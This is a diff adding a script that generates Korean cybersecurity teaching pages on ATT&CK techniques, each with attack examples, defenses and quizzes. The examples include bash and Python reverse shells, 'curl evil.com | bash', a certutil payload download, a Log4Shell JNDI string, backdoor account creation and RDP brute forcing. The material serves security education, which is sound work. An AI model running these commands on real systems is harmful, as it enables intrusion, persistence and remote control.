@@ -1,0 +1,268 @@
+const fs = require('fs');
+const path = require('path');
+
+const EDU_DIR = path.join(__dirname, 'public', 'edu');
+const JSON_DIR = path.join(__dirname, 'src', 'data', 'lab-scenarios');
+
+// HTML template generator
+function html(c) {
+  return `<!DOCTYPE html>
+<html lang="ko" class="light" data-technique-id="${c.id}">
+<head>
+    <script>(function(){if(new URLSearchParams(window.location.search).get('preview')==='1')return;try{var key='sb-bnwbybawqrnhznirivfg-auth-token';var s=localStorage.getItem(key);if(!s||!JSON.parse(s)){window.location.replace('/login?redirect='+encodeURIComponent(window.location.href));}}catch(e){window.location.replace('/login');}})()</script>
+    <script>var _eduDynLoaded=false;(async function(){try{var SUPA='https://bnwbybawqrnhznirivfg.supabase.co';var KEY='sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';var res=await fetch(SUPA+'/rest/v1/edu_html_content?page_id=eq.${c.pid}&select=content&limit=1',{headers:{'apikey':KEY,'Authorization':'Bearer '+KEY}});if(res.ok){var data=await res.json();if(data&&data.length>0&&data[0].content){_eduDynLoaded=true;document.open();document.write(data[0].content);document.close();return;}}}catch(e){}document.documentElement.classList.add('edu-ready');})();setTimeout(function(){if(!_eduDynLoaded)document.documentElement.classList.add('edu-ready');},3000);</script>
+    <style>html:not(.edu-ready) body{visibility:hidden;}html.edu-ready body{visibility:visible;}</style>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="description" content="GOTROOT EDU — ${c.id} ${c.en} ${c.ko} 교육">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
+    <title>GOTROOT EDU | ${c.id} ${c.en}</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config={darkMode:'class',theme:{extend:{fontFamily:{sans:['Inter','sans-serif'],mono:['JetBrains Mono','monospace']},colors:{cbg:'#FFF8F0',cyel:'#F4D06F',cteal:'#9DD9D2',cdark:'#1e293b',cgray:'#475569'}}}}</script>
+    <style>body{scroll-behavior:smooth;background:#FFF8F0;color:#1e293b;transition:background .3s,color .3s}.glass-panel{background:rgba(255,255,255,.7);backdrop-filter:blur(16px);border:1px solid rgba(157,217,210,.5);box-shadow:0 8px 32px rgba(30,41,59,.05)}.dark body{background:#0f172a;color:#f8fafc}.dark .glass-panel{background:rgba(30,41,59,.7);border:1px solid rgba(244,208,111,.2)}.hl-teal{color:#0f766e;font-weight:700}.dark .hl-teal{color:#9DD9D2}.hl-yel{color:#b45309;font-weight:700}.dark .hl-yel{color:#F4D06F}.nav-item.active{background:linear-gradient(90deg,rgba(157,217,210,.3),transparent);border-left:4px solid #9DD9D2;color:#0f766e;font-weight:700}.dark .nav-item.active{background:linear-gradient(90deg,rgba(244,208,111,.2),transparent);border-left:4px solid #F4D06F;color:#F4D06F}.terminal-bg{background:#1e293b;color:#9DD9D2;font-family:'JetBrains Mono',monospace}</style>
+</head>
+<body class="flex flex-col h-screen overflow-hidden">
+    <div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace;"><div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:.25em;">GOTROOT</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">사이버보안 교육 플랫폼</span></div><button onclick="location.href='/'" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;">&larr; 매트릭스 대시보드</button></div>
+    <div class="flex flex-1 overflow-hidden">
+    <button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg"><span id="theme-icon" class="text-xl">🌙</span></button>
+    <aside class="w-64 glass-panel border-r border-[#9DD9D2]/30 h-full hidden md:flex flex-col shrink-0 z-40"><div class="p-6 border-b border-[#9DD9D2]/30"><button onclick="location.href='/'" class="flex items-center gap-1.5 text-xs text-slate-500 hover:text-teal-700 mb-4 transition-colors"><span>&larr;</span><span>대시보드로 돌아가기</span></button><h1 class="text-xl font-bold font-mono hl-teal tracking-tighter">ATT&CK Matrix</h1><p class="text-xs text-cgray dark:text-slate-400 mt-2">${c.id}: ${c.en}</p></div>
+        <nav class="flex-1 overflow-y-auto py-4"><button onclick="go('ch1')" class="nav-item active w-full text-left px-6 py-3 text-sm text-cgray dark:text-slate-400" data-target="ch1">1. 개념과 원리</button><button onclick="go('ch2')" class="nav-item w-full text-left px-6 py-3 text-sm text-cgray dark:text-slate-400" data-target="ch2">2. 공격 기법 분석</button><button onclick="go('ch3')" class="nav-item w-full text-left px-6 py-3 text-sm text-cgray dark:text-slate-400" data-target="ch3">3. 탐지 및 방어</button></nav></aside>
+    <main class="flex-1 overflow-y-auto h-full scroll-smooth" id="main-scroll">
+        <div class="max-w-4xl mx-auto p-6 md:p-12 pb-24 space-y-32">
+            <header class="text-center pt-8"><div class="inline-block px-4 py-1 rounded-full bg-[#F4D06F]/20 border border-[#F4D06F] hl-yel font-mono text-sm mb-4">${c.tactic}</div><h1 class="text-4xl md:text-5xl font-extrabold tracking-tight mb-4 dark:text-white">${c.en}</h1><p class="text-cgray dark:text-slate-400 text-lg">${c.desc}</p></header>
+            <section id="ch1" class="scroll-mt-12 opacity-0 translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-[#9DD9D2] pb-2 dark:text-white"><span class="hl-teal">#1.</span> 개념과 원리</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-[#F4D06F]"><h3 class="font-bold text-lg mb-2 hl-yel">${c.c1t}</h3><p class="text-cgray dark:text-slate-300 leading-relaxed">${c.c1}</p></div>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        <div class="glass-panel p-4 rounded-xl border-l-4 border-l-red-400"><h4 class="font-bold text-sm text-red-600 dark:text-red-400 mb-2">${c.cards[0][0]}</h4><p class="text-xs text-cgray dark:text-slate-400">${c.cards[0][1]}</p></div>
+                        <div class="glass-panel p-4 rounded-xl border-l-4 border-l-yellow-400"><h4 class="font-bold text-sm hl-yel mb-2">${c.cards[1][0]}</h4><p class="text-xs text-cgray dark:text-slate-400">${c.cards[1][1]}</p></div>
+                        <div class="glass-panel p-4 rounded-xl border-l-4 border-l-purple-400"><h4 class="font-bold text-sm text-purple-600 dark:text-purple-400 mb-2">${c.cards[2][0]}</h4><p class="text-xs text-cgray dark:text-slate-400">${c.cards[2][1]}</p></div>
+                    </div>
+                </div>
+            </section>
+            <section id="ch2" class="scroll-mt-12 opacity-0 translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-[#9DD9D2] pb-2 dark:text-white"><span class="hl-teal">#2.</span> 공격 기법 분석</h2>
+                <div class="space-y-6">
+                    <div class="terminal-bg rounded-xl p-4 text-xs">${c.term.map(l => '<div'+(l.startsWith('#')?' class="text-[#F4D06F]"':l.startsWith('//')?' class="text-slate-500"':'')+'>'+l+'</div>').join('\n                        ')}</div>
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400"><h3 class="font-bold text-lg mb-2 text-red-600 dark:text-red-400">공격 분석</h3><ul class="list-disc list-inside text-sm text-cgray dark:text-slate-300 space-y-2">${c.atk.map(a=>'<li>'+a+'</li>').join('')}</ul></div>
+                </div>
+            </section>
+            <section id="ch3" class="scroll-mt-12 opacity-0 translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-[#9DD9D2] pb-2 dark:text-white"><span class="hl-teal">#3.</span> 탐지 및 방어 + 퀴즈</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-green-400"><h3 class="font-bold text-lg mb-2 text-green-700 dark:text-green-400">방어 전략</h3><ul class="list-disc list-inside text-sm text-cgray dark:text-slate-300 space-y-2">${c.def.map(d=>'<li>'+d+'</li>').join('')}</ul></div>
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-[#9DD9D2]"><h3 class="font-bold text-lg mb-4 hl-teal">미니 실습</h3>
+                        <div class="terminal-bg rounded-lg p-4 text-xs mb-4">
+                            <div class="text-slate-400 mb-2">[ ${c.en} Simulation ]</div>
+                            <div id="sim-output" class="space-y-1"><div class="text-[#9DD9D2]">$ 분석 시작...</div></div>
+                            <button onclick="runSim()" class="mt-3 px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 text-xs font-mono">&#9654; 시뮬레이션 실행</button>
+                        </div>
+                    </div>
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-[#F4D06F]"><h3 class="font-bold text-lg mb-4 hl-yel">퀴즈</h3><div id="quiz-area" class="space-y-4">
+                        <p class="text-sm text-cgray dark:text-slate-300 font-bold">${c.qq}</p>
+                        <div class="space-y-2">${c.qc.map((ch,i)=>'<button onclick="checkQuiz(this,\\'+(i===c.qa?'correct':'wrong')+'\\')" class="block w-full text-left px-4 py-2 rounded-lg glass-panel text-sm hover:border-[#F4D06F] transition-colors">'+String.fromCharCode(65+i)+'. '+ch+'</button>').join('')}</div>
+                        <p id="quiz-result" class="text-sm font-bold mt-2 hidden"></p>
+                    </div></div>
+                </div>
+            </section>
+        </div>
+    </main>
+    </div>
+<script>
+function toggleTheme(){document.documentElement.classList.toggle('dark');document.getElementById('theme-icon').textContent=document.documentElement.classList.contains('dark')?'\\u2600\\uFE0F':'\\uD83C\\uDF19';}
+function go(id){document.getElementById(id)?.scrollIntoView({behavior:'smooth'});document.querySelectorAll('.nav-item').forEach(n=>{n.classList.toggle('active',n.dataset.target===id);});}
+document.getElementById('main-scroll')?.addEventListener('scroll',()=>{const sects=['ch1','ch2','ch3'];let cur='ch1';sects.forEach(s=>{const el=document.getElementById(s);if(el&&el.getBoundingClientRect().top<200)cur=s;});document.querySelectorAll('.nav-item').forEach(n=>n.classList.toggle('active',n.dataset.target===cur));});
+const obs=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){e.target.classList.remove('opacity-0','translate-y-10');e.target.classList.add('opacity-100','translate-y-0');}}),{threshold:0.1});document.querySelectorAll('.section-observe').forEach(s=>obs.observe(s));
+function runSim(){const o=document.getElementById('sim-output');const lines=${JSON.stringify(c.sim)};let i=0;const iv=setInterval(()=>{if(i>=lines.length){clearInterval(iv);return;}o.innerHTML+='<div class="'+(lines[i].includes('\\u26A0')?'text-red-400':'text-[#9DD9D2]')+'">'+lines[i]+'</div>';i++;},500);}
+function checkQuiz(el,r){const res=document.getElementById('quiz-result');res.classList.remove('hidden');if(r==='correct'){res.textContent='\\u2705 '+${JSON.stringify(c.qy)};res.className='text-sm font-bold mt-2 text-green-600 dark:text-green-400';}else{res.textContent='\\u274C '+${JSON.stringify(c.qn)};res.className='text-sm font-bold mt-2 text-red-600 dark:text-red-400';}}
+</script>
+</body>
+</html>`;
+}
+
+// All remaining techniques data
+const items = [
+  {id:'T1078.003',pid:'t1078-003-local-accounts',file:'t1078-003-local-accounts',en:'Local Accounts',ko:'로컬 계정',tactic:'Initial Access',desc:'운영체제의 로컬 계정을 탈취하거나 생성하여 시스템에 접근',c1t:'로컬 계정 악용이란?',c1:'<strong>운영체제에 생성된 로컬 사용자 계정</strong>을 탈취하거나 새로 생성하여 시스템에 접근하는 기법입니다. SAM 데이터베이스에서 해시를 덤프하거나, 비밀번호 스프레이 공격, 또는 관리자 권한으로 새 로컬 계정을 생성합니다. 도메인 계정과 달리 해당 시스템에서만 유효합니다.',cards:[['SAM 해시 덤프','Mimikatz/secretsdump로 로컬 계정 NTLM 해시 추출'],['비밀번호 스프레이','흔한 비밀번호로 다수 로컬 계정 동시 시도'],['계정 생성','관리자 권한으로 백도어 로컬 계정 생성']],term:['# SAM 데이터베이스 해시 덤프','secretsdump.py -sam SAM -system SYSTEM LOCAL','','# 로컬 계정 생성 (백도어)','net user backdoor P@ssw0rd123! /add','net localgroup administrators backdoor /add','','// 레지스트리에서 SAM 해시 추출 가능'],atk:['<strong>Mimikatz/secretsdump</strong>: SAM 해시 덤프로 NTLM 해시 추출','<strong>Pass-the-Hash</strong>: 탈취한 해시로 인증 없이 접근','<strong>비밀번호 스프레이</strong>: 계정 잠금 회피하며 흔한 비밀번호 시도','<strong>백도어 계정</strong>: 관리자 권한으로 새 로컬 계정 생성'],def:['<strong>LAPS</strong>: Local Administrator Password Solution으로 로컬 관리자 비밀번호 자동 관리','<strong>Credential Guard</strong>: Windows 가상화 기반 자격증명 보호','<strong>로컬 관리자 비활성화</strong>: 기본 Administrator 계정 비활성화','<strong>Sysmon 모니터링</strong>: 계정 생성/수정 이벤트 감시','<strong>비밀번호 정책</strong>: 최소 12자, 복잡도 요구, 정기 변경'],sim:['$ SAM 데이터베이스 분석:','$   로컬 계정 5개 발견','$   Administrator: NTLM 해시 추출 ⚠️','$   Guest: 비활성화 ✓','$   backdoor: 신규 계정 발견! ⚠️','$ ','$ 비밀번호 정책 검사:','$   최소 길이: 8자 (부족!) ⚠️','$   복잡도: 미적용 ⚠️','$ ','$ ⚠️ 로컬 계정 보안 취약!'],qq:'Q1. 로컬 관리자 비밀번호를 안전하게 관리하는 가장 좋은 방법은?',qc:['모든 시스템에 같은 비밀번호 사용','LAPS로 각 시스템마다 고유 비밀번호 자동 관리','비밀번호를 문서에 기록하여 보관','기본 Administrator 계정 그대로 사용'],qa:1,qy:'정답! LAPS는 각 시스템의 로컬 관리자 비밀번호를 AD에서 자동으로 고유하게 관리합니다.',qn:'오답. LAPS(Local Administrator Password Solution)는 각 시스템마다 고유한 비밀번호를 자동 생성하고 AD에 안전하게 저장합니다.'},
+  {id:'T1078.003',pid:'t1078-003-local-accounts',file:'t1078-003-local-accounts'},
+  {id:'T1078.004',pid:'t1078-004-cloud-accounts',file:'t1078-004-cloud-accounts',en:'Cloud Accounts',ko:'클라우드 계정',tactic:'Initial Access',desc:'AWS/Azure/GCP 클라우드 서비스 계정을 탈취하여 클라우드 인프라에 접근',c1t:'클라우드 계정 악용이란?',c1:'<strong>AWS IAM, Azure AD, GCP 서비스 계정 등 클라우드 플랫폼의 자격증명</strong>을 탈취하여 클라우드 인프라에 접근하는 기법입니다. 노출된 API 키, 토큰 유출, 피싱으로 탈취한 SSO 자격증명 등을 활용합니다. 클라우드 환경에서는 하나의 계정으로 수천 개의 리소스에 접근할 수 있어 피해 범위가 매우 넓습니다.',cards:[['API 키 노출','GitHub/코드에 하드코딩된 AWS 키 탈취'],['SSO 피싱','Azure AD/Google Workspace 자격증명 피싱'],['서비스 계정','과도한 권한의 서비스 계정 키 탈취']],term:['# GitHub에서 노출된 AWS 키 검색','trufflehog git https://github.com/target/repo','','# AWS CLI로 탈취한 키 사용','aws configure set aws_access_key_id AKIA...','aws s3 ls  # 모든 S3 버킷 나열','','// 클라우드 자격증명 = 왕국의 열쇠'],atk:['<strong>GitHub 스캔</strong>: trufflehog/gitleaks로 노출된 API 키 검색','<strong>SSRF 악용</strong>: 메타데이터 서비스(169.254.169.254)로 임시 토큰 탈취','<strong>토큰 피싱</strong>: OAuth 앱을 통한 클라우드 토큰 탈취','<strong>서비스 계정</strong>: 과도한 권한의 SA 키 파일 탈취'],def:['<strong>IAM 최소 권한</strong>: 필요한 최소 권한만 부여','<strong>키 로테이션</strong>: API 키/토큰 정기적 교체 (90일)','<strong>MFA 필수</strong>: 모든 클라우드 계정에 MFA 적용','<strong>Secret Manager</strong>: 코드에 키 하드코딩 금지','<strong>CloudTrail/감사 로그</strong>: 모든 API 호출 모니터링'],sim:['$ 클라우드 계정 보안 감사:','$   AWS IAM 사용자: 15명','$   MFA 미적용: 3명 ⚠️','$   90일 이상 미사용 키: 5개 ⚠️','$   과도한 권한(AdministratorAccess): 4명 ⚠️','$ ','$ GitHub 스캔:','$   AKIA... 키 노출 발견! ⚠️','$   리포지토리: target/backend (커밋 3개월 전)','$ ','$ ⚠️ 클라우드 보안 취약점 다수 발견!'],qq:'Q1. 클라우드 API 키가 GitHub에 노출되었을 때 가장 먼저 해야 할 일은?',qc:['GitHub에서 커밋을 삭제한다','즉시 해당 키를 비활성화/로테이션한다','비밀번호를 변경한다','CloudTrail을 비활성화한다'],qa:1,qy:'정답! 키가 노출되면 즉시 비활성화하고 새 키를 생성해야 합니다. Git 히스토리에 남아 있으므로 삭제만으로는 부족합니다.',qn:'오답. 가장 먼저 해야 할 일은 노출된 키를 즉시 비활성화하고 새 키로 교체하는 것입니다.'},
+  {id:'T1190',pid:'t1190-exploit-public-facing-app',file:'t1190-exploit-public-facing-app',en:'Exploit Public-Facing Application',ko:'공개 애플리케이션 취약점 악용',tactic:'Initial Access',desc:'웹 애플리케이션, 메일 서버 등 인터넷에 공개된 서비스의 취약점을 악용하여 초기 접근',c1t:'공개 앱 취약점 악용이란?',c1:'<strong>인터넷에 노출된 웹 애플리케이션, API, VPN, 이메일 서버 등의 소프트웨어 취약점</strong>을 악용하여 초기 접근을 획득합니다. SQL Injection, RCE(원격 코드 실행), 파일 업로드 취약점 등이 대표적입니다. Log4Shell(CVE-2021-44228), ProxyShell(Exchange), MOVEit 등 대규모 사건의 원인이 됩니다.',cards:[['웹 애플리케이션','SQL Injection, XSS, RCE, 파일 업로드 취약점'],['VPN/게이트웨이','Pulse Secure, Fortinet, Citrix VPN 취약점'],['메일 서버','Exchange ProxyShell/ProxyLogon 취약점 악용']],term:['# Log4Shell (CVE-2021-44228) 공격 예시','curl -H "X-Api-Version: ${jndi:ldap://evil.com/exploit}"','','# SQL Injection','sqlmap -u "https://target.com/search?q=test" --dbs','','# Exchange ProxyShell','python proxyshell_exploit.py target.com','','// 패치되지 않은 서버 = 열린 문'],atk:['<strong>CVE 스캔</strong>: Nuclei, Nessus로 알려진 취약점 자동 스캔','<strong>웹 취약점</strong>: OWASP Top 10 (SQLi, XSS, RCE)','<strong>제로데이</strong>: 패치 전 취약점 악용 (MOVEit, Log4Shell)','<strong>API 취약점</strong>: 인증 우회, BOLA, SSRF'],def:['<strong>패치 관리</strong>: 보안 패치 72시간 이내 적용','<strong>WAF</strong>: 웹 애플리케이션 방화벽으로 공격 필터링','<strong>취약점 스캐닝</strong>: 주간 자동 취약점 스캔','<strong>ASM</strong>: Attack Surface Management로 노출 자산 관리','<strong>가상 패칭</strong>: 패치 전 WAF 규칙으로 임시 방어'],sim:['$ 웹 애플리케이션 취약점 스캔:','$   Nuclei 스캔 시작...','$   CVE-2021-44228 Log4Shell → 취약! ⚠️','$   CVE-2023-34362 MOVEit → 패치됨 ✓','$   SQL Injection → /search 파라미터 취약! ⚠️','$ ','$ Exchange 서버 검사:','$   ProxyShell (CVE-2021-34473) → 패치됨 ✓','$   ProxyNotShell → 취약! ⚠️','$ ','$ ⚠️ 2개 취약점 즉시 패치 필요!'],qq:'Q1. 공개 애플리케이션 취약점 방어에서 가장 중요한 것은?',qc:['방화벽만 설치하면 충분하다','보안 패치를 신속하게 적용하고 WAF로 보호한다','내부 네트워크만 보호하면 된다','취약점 스캔은 연 1회면 충분하다'],qa:1,qy:'정답! 보안 패치의 신속한 적용과 WAF가 공개 앱 방어의 핵심입니다.',qn:'오답. 패치 관리와 WAF를 함께 적용하여 알려진/미알려진 취약점 모두를 방어해야 합니다.'},
+  {id:'T1133',pid:'t1133-external-remote-services',file:'t1133-external-remote-services',en:'External Remote Services',ko:'외부 원격 서비스',tactic:'Initial Access',desc:'VPN, RDP, SSH 등 외부 원격 접근 서비스를 통한 초기 침투',c1t:'외부 원격 서비스 악용이란?',c1:'<strong>VPN, RDP(원격 데스크톱), SSH, Citrix 등 합법적인 원격 접근 서비스</strong>를 탈취된 자격증명이나 취약점으로 악용하여 내부 네트워크에 접근합니다. 재택근무 확대로 원격 서비스 노출이 증가하여 공격 표면이 넓어졌습니다.',cards:[['VPN 접근','탈취한 VPN 자격증명으로 내부 네트워크 접근'],['RDP 무차별 대입','인터넷에 노출된 RDP(3389)에 비밀번호 공격'],['SSH 키 탈취','개인 SSH 키 파일을 탈취하여 서버 접근']],term:['# RDP 무차별 대입','hydra -l administrator -P rockyou.txt rdp://target','','# VPN 자격증명 시도','openconnect --user=stolen_user vpn.target.com','','# SSH 키 탈취 후 접근','ssh -i stolen_id_rsa root@target.com','','// MFA 없는 원격 접근 = 열린 정문'],atk:['<strong>RDP 브루트포스</strong>: 인터넷 노출된 RDP에 Hydra/Crowbar 사용','<strong>VPN 자격증명 재사용</strong>: 유출된 비밀번호로 VPN 로그인','<strong>SSH 키 탈취</strong>: 개발자 워크스테이션에서 SSH 키 탈취','<strong>VPN 취약점</strong>: Pulse Secure, Fortinet VPN 0-day 악용'],def:['<strong>MFA 필수</strong>: VPN/RDP에 다중 인증 적용','<strong>RDP 포트 비노출</strong>: 인터넷에 RDP 직접 노출 금지','<strong>VPN 패치</strong>: VPN 어플라이언스 보안 업데이트 즉시 적용','<strong>Jump Server</strong>: 원격 접근은 반드시 점프 서버를 통해','<strong>제로 트러스트</strong>: ZTNA로 사용자/디바이스 검증 후 접근 허용'],sim:['$ 외부 원격 서비스 점검:','$   RDP (3389): 인터넷 노출! ⚠️','$   VPN: Pulse Secure 9.1R8 → 패치 필요 ⚠️','$   SSH: 키 기반 인증 ✓','$ ','$ RDP 로그인 시도 분석:','$   지난 24시간: 12,847회 실패 ⚠️','$   소스 IP: 45개국에서 접근 시도','$   ⚠️ 무차별 대입 공격 진행 중!','$ ','$ ⚠️ MFA 미적용 + RDP 노출 위험!'],qq:'Q1. 외부 원격 서비스의 가장 효과적인 방어는?',qc:['비밀번호를 자주 변경한다','MFA를 적용하고 RDP를 인터넷에 직접 노출하지 않는다','방화벽에서 모든 포트를 열어둔다','VPN만 사용하면 안전하다'],qa:1,qy:'정답! MFA 적용과 RDP/SSH의 인터넷 비노출이 핵심입니다.',qn:'오답. MFA 적용과 RDP를 인터넷에 직접 노출하지 않는 것이 가장 효과적입니다.'},
+  {id:'T1059.003',pid:'t1059-003-windows-cmd',file:'t1059-003-windows-cmd',en:'Windows Command Shell',ko:'Windows 명령 프롬프트',tactic:'Execution',desc:'cmd.exe를 통한 명령 실행으로 시스템 조작 및 악성 활동 수행',c1t:'CMD를 통한 명령 실행이란?',c1:'<strong>Windows 명령 프롬프트(cmd.exe)</strong>를 통해 시스템 명령을 실행하는 기법입니다. 공격자는 초기 접근 후 cmd.exe로 정찰, 파일 다운로드, 레지스트리 조작, 서비스 제어 등을 수행합니다. 배치 파일(.bat/.cmd)이나 WMI를 통한 원격 명령 실행도 포함됩니다.',cards:[['정찰 명령','whoami, ipconfig, net user 등으로 시스템 정보 수집'],['파일 조작','certutil, bitsadmin으로 파일 다운로드/실행'],['지속성 확보','schtasks, reg add로 자동 시작 설정']],term:['# 정찰 명령어','whoami /all && ipconfig /all && net user','','# certutil로 파일 다운로드 (LOLBin)','certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe','','# 예약 작업으로 지속성','schtasks /create /tn "Update" /tr "C:\\temp\\payload.exe" /sc onlogon','','// LOLBins = Living Off the Land Binaries'],atk:['<strong>LOLBins</strong>: certutil, bitsadmin 등 정상 도구를 악용한 다운로드','<strong>WMI 원격 실행</strong>: wmic process call create로 원격 명령','<strong>레지스트리 조작</strong>: Run 키에 악성코드 등록','<strong>배치 스크립트</strong>: .bat 파일로 자동화된 공격 수행'],def:['<strong>AppLocker/WDAC</strong>: cmd.exe 실행을 승인된 사용자로 제한','<strong>Script Block Logging</strong>: 명령 실행 로깅 활성화','<strong>Sysmon</strong>: 프로세스 생성(Event 1) 모니터링','<strong>LOLBin 모니터링</strong>: certutil, bitsadmin 네트워크 사용 감시','<strong>AMSI</strong>: Antimalware Scan Interface로 스크립트 검사'],sim:['$ CMD 악성 활동 탐지:','$   certutil -urlcache 사용 탐지 ⚠️','$   대상: http://evil.com/payload.exe','$   schtasks 예약 작업 생성 ⚠️','$   작업명: "Update" (의심스러운 이름)','$ ','$ Sysmon 이벤트:','$   Event ID 1: cmd.exe → certutil.exe','$   Event ID 3: certutil → evil.com:80 ⚠️','$ ','$ ⚠️ LOLBin 악용 + 예약 작업 탐지!'],qq:'Q1. certutil을 악용한 파일 다운로드를 탐지하는 가장 좋은 방법은?',qc:['certutil.exe를 삭제한다','Sysmon으로 certutil의 네트워크 연결을 모니터링한다','cmd.exe를 완전히 비활성화한다','방화벽에서 HTTP를 차단한다'],qa:1,qy:'정답! Sysmon Event ID 3(네트워크 연결)으로 certutil의 외부 연결을 감시합니다.',qn:'오답. Sysmon으로 certutil의 네트워크 활동을 모니터링하는 것이 가장 효과적입니다.'},
+  {id:'T1059.004',pid:'t1059-004-unix-shell',file:'t1059-004-unix-shell',en:'Unix Shell',ko:'Unix 셸',tactic:'Execution',desc:'Bash/sh/zsh 등 Unix 셸을 통한 명령 실행으로 시스템 조작',c1t:'Unix 셸 악용이란?',c1:'<strong>Linux/macOS의 Bash, sh, zsh 등의 셸</strong>을 통해 명령을 실행하는 기법입니다. 리버스 셸, 크론탭 등록, 파일 다운로드 등 다양한 악성 활동에 사용됩니다. 파이프라인과 리다이렉션을 조합한 복잡한 명령 체인이 가능합니다.',cards:[['리버스 셸','bash -i >& /dev/tcp/attacker/4444 0>&1'],['크론 지속성','crontab에 악성 명령 등록으로 주기적 실행'],['파일 다운로드','curl/wget으로 페이로드 다운로드 및 실행']],term:['# Bash 리버스 셸','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1','','# curl로 페이로드 다운로드 + 실행','curl -s http://evil.com/payload.sh | bash','','# 크론탭으로 지속성','(crontab -l; echo "*/5 * * * * /tmp/.hidden") | crontab -','','// 파이프를 통한 fileless 실행'],atk:['<strong>리버스 셸</strong>: /dev/tcp, netcat, socat으로 원격 접근','<strong>Fileless 실행</strong>: curl | bash로 디스크에 파일 없이 실행','<strong>SSH 터널링</strong>: SSH 포트 포워딩으로 내부 서비스 접근','<strong>크론 지속성</strong>: 사용자/시스템 crontab에 악성 명령 등록'],def:['<strong>Auditd</strong>: 셸 명령 실행 감사 로깅','<strong>SELinux/AppArmor</strong>: 프로세스 접근 제한','<strong>셸 제한</strong>: 불필요한 사용자의 셸 접근 비활성화 (nologin)','<strong>EDR</strong>: Linux 엔드포인트 탐지 및 대응','<strong>네트워크 모니터링</strong>: 아웃바운드 리버스 셸 연결 탐지'],sim:['$ Unix 셸 악성 활동 탐지:','$   bash -i >& /dev/tcp 패턴 탐지 ⚠️','$   대상: 10.0.0.1:4444 (리버스 셸)','$   curl | bash 실행 탐지 ⚠️','$   소스: http://evil.com/payload.sh','$ ','$ 크론탭 검사:','$   /tmp/.hidden 실행 등록 ⚠️','$   5분 간격 실행 (지속성)','$ ','$ ⚠️ 리버스 셸 + 크론 지속성 탐지!'],qq:'Q1. Unix 리버스 셸을 탐지하는 가장 효과적인 방법은?',qc:['bash를 삭제한다','Auditd와 네트워크 모니터링으로 비정상 아웃바운드 연결을 탐지한다','모든 사용자의 인터넷 접근을 차단한다','크론탭을 비활성화한다'],qa:1,qy:'정답! Auditd로 셸 명령을 로깅하고, 네트워크 모니터링으로 비정상 아웃바운드 연결을 탐지합니다.',qn:'오답. Auditd와 네트워크 모니터링의 조합이 리버스 셸 탐지에 가장 효과적입니다.'},
+  {id:'T1059.006',pid:'t1059-006-python',file:'t1059-006-python',en:'Python',ko:'Python 악용',tactic:'Execution',desc:'Python 인터프리터를 통한 악성 스크립트 실행',c1t:'Python 악용이란?',c1:'<strong>시스템에 설치된 Python 인터프리터</strong>를 이용해 악성 스크립트를 실행합니다. Python은 대부분의 Linux/macOS에 기본 설치되어 있으며, 강력한 라이브러리로 네트워크 스캔, 자격증명 수집, 파일 암호화 등이 가능합니다. Impacket, Empire 등 주요 공격 도구가 Python으로 개발되어 있습니다.',cards:[['원라이너 실행','python -c "..." 로 파일 없이 악성코드 실행'],['공격 프레임워크','Impacket, Empire, Cobalt Strike 모듈'],['스크립트 난독화','PyArmor, base64 인코딩으로 분석 회피']],term:['# Python 리버스 셸','python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"10.0.0.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"','','# Impacket secretsdump','secretsdump.py domain/user:pass@target','','// Python = 해커의 스위스 아미 나이프'],atk:['<strong>Python 리버스 셸</strong>: socket 모듈로 원격 접근','<strong>Impacket</strong>: Windows 프로토콜 해킹 도구 모음','<strong>스크립트 인젝션</strong>: 웹앱의 Python 코드 실행 취약점','<strong>패키지 악용</strong>: pip로 악성 패키지 설치'],def:['<strong>Python 실행 제한</strong>: AppLocker로 승인된 사용자만 실행 허용','<strong>AMSI 연동</strong>: Python 실행 시 스크립트 검사','<strong>EDR</strong>: Python 프로세스의 비정상 활동 모니터링','<strong>패키지 관리</strong>: 승인된 패키지만 설치 허용','<strong>로그 감시</strong>: python -c 원라이너 실행 탐지'],sim:['$ Python 악성 활동 탐지:','$   python3 -c 원라이너 실행 ⚠️','$   socket.connect (리버스 셸 